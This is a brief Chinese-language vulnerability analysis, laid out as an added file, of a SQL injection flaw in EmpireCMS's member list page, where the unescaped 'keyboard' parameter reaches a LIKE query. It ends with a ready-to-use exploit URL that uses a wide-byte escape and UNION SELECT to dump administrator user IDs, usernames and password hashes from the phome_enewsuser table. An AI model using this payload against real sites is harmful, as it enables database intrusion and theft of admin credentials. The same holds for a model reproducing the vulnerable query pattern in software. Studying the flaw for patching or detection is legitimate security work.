@@ -1,0 +1,22 @@
+帝国ECMS 漏洞分析
+
+[帝国ECMS 漏洞分析 全文]
+帝国ECMS /e/member/list/index.php文件:
+
+if($sear)
+{
+ $keyboard=RepPostVar2($_GET[''keyboard'']);
+ if($keyboard)
+ {
+  $add.=$where.$user_username." like ''%$keyboard%''";
+ }
+ $search.="&sear=1&keyboard=$keyboard";
+}
+
+判断sear参数是否存在,然后直接去keyboard的参数,然后再判断keyboard值是否为空,如果不为
+空就直接把keyboard带入查询产生注射漏洞.
+
+利用方法:
+
+/e/member/list/index.php?sear=1&totalnum=1&keyboard=%D9''+union+select+1,1,1,concat(char
+(123),userid,char(95),username,char(95),password,char(125))+from+phome_enewsuser/*
